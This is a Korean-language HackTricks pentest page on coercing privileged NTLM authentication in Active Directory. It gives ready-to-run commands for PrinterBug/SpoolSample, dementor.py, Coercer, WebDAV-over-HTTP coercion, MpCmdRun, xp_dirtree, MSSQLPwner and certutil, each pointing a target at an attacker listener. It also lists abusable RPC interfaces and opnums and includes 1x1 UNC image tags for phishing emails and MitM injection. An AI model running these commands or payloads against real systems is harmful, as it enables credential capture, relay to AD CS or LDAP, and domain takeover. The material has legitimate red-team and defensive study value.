# NTLM Privileged Authentication 강제

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)는 서드파티 dependencies를 피하기 위해 MIDL compiler를 사용해 C#으로 작성된 **remote authentication triggers**의 **collection**입니다.

## Spooler Service Abuse

_**Print Spooler**_ service가 **enabled**되어 있다면, 이미 알고 있는 일부 AD credentials를 사용해 Domain Controller의 print server에 새 print jobs에 대한 **update**를 **request**하고, notification을 특정 **system**으로 **send**하도록 지시할 수 있습니다.\
프린터가 임의의 system에 notification을 보낼 때는 해당 **system에 대해 authenticate**해야 한다는 점에 유의하세요. 따라서 attacker는 _**Print Spooler**_ service가 임의의 system에 대해 authenticate하도록 만들 수 있으며, 이 authentication에서 service는 **computer account**를 **use**합니다.

내부적으로 classic **PrinterBug** primitive는 **`RpcRemoteFindFirstPrinterChangeNotificationEx`**를 **`\\PIPE\\spoolss`**를 통해 악용합니다. attacker는 먼저 printer/server handle을 열고, `pszLocalMachine`에 fake client name을 전달하여 target spooler가 **attacker-controlled host로 돌아가는** notification channel을 생성하도록 합니다. 이것이 그 효과가 직접적인 code execution이 아니라 **outbound authentication coercion**인 이유입니다.<sup>[[2]](#references)</sup>\
spooler 자체에서 **RCE/LPE**를 찾고 있다면 [PrintNightmare](printnightmare.md)를 확인하세요. 이 페이지는 **coercion and relay**에 초점을 둡니다.

### Domain의 Windows Servers 찾기

PowerShell을 사용해 Windows hosts를 나열합니다. Servers는 일반적으로 우선순위가 가장 높은 targets이므로 먼저 해당 hosts에 집중하세요:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### 수신 대기 중인 Spooler 서비스 찾기

약간 수정한 @mysmartlogin(Vincent Le Toux)의 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)를 사용하여 Spooler Service가 수신 대기 중인지 확인합니다:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux에서 `rpcdump.py`를 사용하여 **MS-RPRN** 프로토콜을 찾을 수도 있습니다:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
또는 Linux에서 **NetExec/CrackMapExec**을 사용해 호스트를 빠르게 테스트할 수 있습니다:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
spooler endpoint가 존재하는지만 확인하는 대신 **coercion surfaces를 열거**하려면 **Coercer scan mode**를 사용하세요:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
이는 EPM에서 endpoint를 확인하는 것만으로는 print RPC interface가 등록되어 있다는 사실만 알 수 있기 때문에 유용합니다. 현재 privileges로 모든 coercion method에 접근할 수 있거나 해당 host가 사용 가능한 authentication flow를 발생시킨다는 보장은 **없습니다**.

### service에 임의의 host에 대해 authenticate하도록 요청

여기에서 [SpoolSample을 compile](https://github.com/NotMedic/NetNTLMtoSilverTicket)할 수 있습니다.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
또는 Linux를 사용하는 경우 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 또는 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)를 사용하세요.
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
**Coercer**를 사용하면 spooler 인터페이스를 직접 대상으로 지정하여 어떤 RPC method가 노출되어 있는지 추측하지 않아도 됩니다:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### WebClient를 사용하여 SMB 대신 HTTP 강제

일반적인 PrinterBug는 보통 `\\attacker\share`에 대한 **SMB** authentication을 유도하며, 이는 여전히 **capture**, **HTTP targets로 relay**하거나 **SMB signing이 없는 환경에서 relay**하는 데 유용합니다.\
하지만 최신 환경에서는 **SMB signing**으로 인해 **SMB에서 SMB로 relay**하는 것이 자주 차단되므로, operators는 대신 **HTTP/WebDAV** authentication을 강제하는 방식을 선호합니다.

대상에서 **WebClient** service가 실행 중인 경우, Windows가 **WebDAV over HTTP**를 사용하도록 만드는 형식으로 listener를 지정할 수 있습니다:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
이는 **`ntlmrelayx --adcs`** 또는 기타 HTTP relay targets와 함께 사용할 때 특히 유용합니다. 강제로 유도된 연결에서 SMB relay 가능 여부에 의존하지 않아도 되기 때문입니다. 중요한 주의 사항은 HTTP/WebDAV variant가 작동하려면 피해자에서 **WebClient가 실행 중이어야 한다는 것**입니다.

### Unconstrained Delegation과 결합

공격자가 [Unconstrained Delegation](unconstrained-delegation.md)으로 구성된 computer를 장악한 경우, **printer가 해당 computer에 authenticate하도록 강제할 수 있습니다**. 그러면 printer computer account의 **TGT**가 unconstrained-delegation host의 memory에 cache되며, 공격자는 이를 [Pass the Ticket](pass-the-ticket.md)과 함께 검색하고 재사용할 수 있습니다.

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (outbound auth를 trigger하는 interfaces/opnums)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: 동일한 spooler pipe의 asynchronous print interface이며, 지정된 host에서 접근 가능한 methods를 열거하려면 Coercer를 사용합니다<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (또한 \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon을 통해서도 사용 가능)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

참고: 이러한 methods는 UNC path를 전달할 수 있는 parameters(예: `\\attacker\share`)를 허용합니다. 처리되면 Windows는 해당 UNC에 machine/user context로 authenticate하므로 NetNTLM capture 또는 relay가 가능합니다.\
spooler abuse의 경우, **MS-RPRN opnum 65**가 가장 일반적이고 문서화가 잘 된 primitive로 남아 있습니다. protocol specification에 `pszLocalMachine`으로 지정된 client로 돌아가는 notification channel을 server가 생성한다고 명시되어 있기 때문입니다.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: \\PIPE\\even을 통한 MS-EVEN (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target가 제공된 backup log path를 열려고 시도하며 attacker가 제어하는 UNC에 authenticate합니다.<sup>[[1]](#references)</sup>
- Practical use: Tier 0 assets(DC/RODC/Citrix/etc.)가 NetNTLM을 emit하도록 강제한 다음, 이를 AD CS endpoints(ESC8/ESC11 scenarios) 또는 기타 privileged services로 relay합니다.<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack은 **Exchange Server의 `PushSubscription` feature에서 발견된 flaw**의 결과입니다. 이 feature를 사용하면 mailbox가 있는 모든 domain user가 Exchange server를 강제로 client가 제공한 host에 HTTP로 authenticate하도록 만들 수 있습니다.

기본적으로 **Exchange service는 SYSTEM으로 실행**되며 excessive privileges가 부여됩니다(구체적으로, 2019 Cumulative Update 이전에는 domain에 대한 **WriteDacl privileges**를 가졌습니다). 이 flaw는 LDAP로 information을 relay한 후 domain NTDS database를 extract할 수 있도록 악용할 수 있습니다. LDAP로 relay할 수 없는 경우에도 이 flaw를 사용해 domain 내 다른 hosts로 relay하고 authenticate할 수 있습니다. 이 attack을 성공적으로 exploit하면 authenticate된 모든 domain user account로 즉시 Domain Admin에 access할 수 있습니다.

## Windows 내부

이미 Windows machine 내부에 있다면 privileged accounts를 사용해 Windows가 server에 connect하도록 다음과 같이 강제할 수 있습니다:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
또는 다음과 같은 다른 technique을 사용할 수 있습니다: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin(Microsoft에서 서명한 바이너리)을 사용하여 NTLM authentication을 강제할 수 있습니다:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### 이메일을 통해

침해하려는 시스템에 로그인하는 사용자의 **email address**를 알고 있다면, 다음과 같은 **1x1 image**가 포함된 **email**을 그 사용자에게 보내기만 하면 됩니다.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
피해자가 이를 열면 Windows가 인증을 시도합니다.

### MitM

MitM 공격을 수행하고 피해자가 보는 페이지에 HTML을 삽입할 수 있다면 다음과 같은 이미지를 삽입해 보세요:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM authentication을 강제하고 phish하는 기타 방법


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 크래킹

[NTLMv1 challenges를 캡처할 수 있다면, 이를 crack하는 방법을 여기에서 확인하세요](../ntlm/index.html#ntlmv1-attack).\
_NTLMv1을 crack하려면 Responder challenge를 "1122334455667788"로 설정해야 한다는 점을 기억하세요._

## References

- [1] [Unit 42 – Authentication Coercion은 계속 진화한다](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
